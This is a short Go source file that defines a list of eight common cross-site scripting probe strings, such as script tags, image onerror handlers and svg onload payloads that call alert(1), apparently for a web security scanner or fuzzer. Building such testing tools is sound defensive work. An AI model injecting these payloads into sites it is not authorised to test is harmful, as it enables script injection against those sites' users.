package main

// Common XSS Payloads
var Payloads = []string{
	"<script>alert(1)</script>",
	"\"><script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"'><img src=x onerror=alert(1)>",
	"javascript:alert(1)",
	"<svg/onload=alert(1)>",
	"\"><svg/onload=alert(1)>",
	"'-alert(1)-'",
}
